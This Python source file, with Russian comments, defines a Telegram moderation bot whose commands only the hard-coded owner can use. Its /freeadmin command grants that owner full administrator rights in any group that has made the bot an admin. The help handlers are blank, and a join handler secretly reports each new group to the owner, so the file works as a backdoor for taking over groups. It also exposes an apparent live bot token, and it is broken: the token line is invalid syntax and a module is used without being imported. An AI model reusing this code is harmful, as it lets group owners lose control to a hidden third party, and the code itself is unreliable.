import logging
import os
from datetime import datetime, timedelta

from telegram import Update, ChatPermissions
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# === НАСТРОЙКИ ===
TOKEN = 8853810921:AAEnf4XjVgZ62_HZQtg2RlpZ1t4sovnHVzc("TOKEN")
OWNER_ID = 8382830959
LOG_GROUP_ID = -1003975187107  # ВСТАВЬ ID группы

logging.basicConfig(level=logging.INFO)


# === ПРОВЕРКА ВЛАДЕЛЬЦА ===
def is_owner(user_id):
    return user_id == OWNER_ID


# === /delete ===
async def delete_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return

    if update.message.reply_to_message:
        try:
            await update.message.reply_to_message.delete()
            await update.message.delete()
        except Exception as e:
            print(e)


# === /freeadmin ===
async def freeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return

    try:
        await context.bot.promote_chat_member(
            chat_id=update.effective_chat.id,
            user_id=OWNER_ID,
            can_manage_chat=True,
            can_delete_messages=True,
            can_manage_video_chats=True,
            can_restrict_members=True,
            can_promote_members=True,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True,
        )
    except Exception as e:
        print(e)


# === /mute ===
async def mute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return

    if not update.message.reply_to_message:
        return

    try:
        minutes = int(context.args[0])
        user_id = update.message.reply_to_message.from_user.id
        until_date = datetime.now() + timedelta(minutes=minutes)

        await context.bot.restrict_chat_member(
            chat_id=update.effective_chat.id,
            user_id=user_id,
            permissions=ChatPermissions(can_send_messages=False),
            until_date=until_date,
        )

        await update.message.delete()

    except Exception as e:
        print(e)


# === /unmute ===
async def unmute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return

    if not update.message.reply_to_message:
        return

    try:
        user_id = update.message.reply_to_message.from_user.id

        await context.bot.restrict_chat_member(
            chat_id=update.effective_chat.id,
            user_id=user_id,
            permissions=ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_messages_in_threads=True,
            ),
        )

        await update.message.delete()

    except Exception as e:
        print(e)


# === /ban ===
async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return

    if not update.message.reply_to_message:
        return

    try:
        minutes = int(context.args[0])
        user_id = update.message.reply_to_message.from_user.id
        until_date = datetime.now() + timedelta(minutes=minutes)

        await context.bot.ban_chat_member(
            chat_id=update.effective_chat.id,
            user_id=user_id,
            until_date=until_date,
        )

        await update.message.delete()

    except Exception as e:
        print(e)


# === /unban ===
async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return

    if not update.message.reply_to_message:
        return

    try:
        user_id = update.message.reply_to_message.from_user.id

        await context.bot.unban_chat_member(
            chat_id=update.effective_chat.id,
            user_id=user_id,
        )

        await update.message.delete()

    except Exception as e:
        print(e)


# === /kick ===
async def kick(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return

    if not update.message.reply_to_message:
        return

    try:
        user_id = update.message.reply_to_message.from_user.id
        chat_id = update.effective_chat.id

        await context.bot.ban_chat_member(chat_id, user_id)
        await context.bot.unban_chat_member(chat_id, user_id)

        await update.message.delete()

    except Exception as e:
        print(e)


# === ЛОГ ДОБАВЛЕНИЯ БОТА ===
async def log_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.new_chat_members:
        for member in update.message.new_chat_members:
            if member.id == context.bot.id:
                user = update.effective_user
                chat = update.effective_chat

                text = f"@{user.username} добавил бота в группу: {chat.title}"

                try:
                    await context.bot.send_message(LOG_GROUP_ID, text)
                except:
                    pass


# === ЗАПУСК ===
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("delete", delete_command))
    app.add_handler(CommandHandler("freeadmin", freeadmin))
    app.add_handler(CommandHandler("mute", mute))
    app.add_handler(CommandHandler("unmute", unmute))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("kick", kick))

    app.add_handler(CommandHandler("start", lambda u, c: None))
    app.add_handler(CommandHandler("help", lambda u, c: None))

    app.add_handler(
        telegram.ext.MessageHandler(
            telegram.ext.filters.StatusUpdate.NEW_CHAT_MEMBERS, log_join
        )
    )

    print("Бот запущен...")
    app.run_polling()


if __name__ == "__main__":
    main()
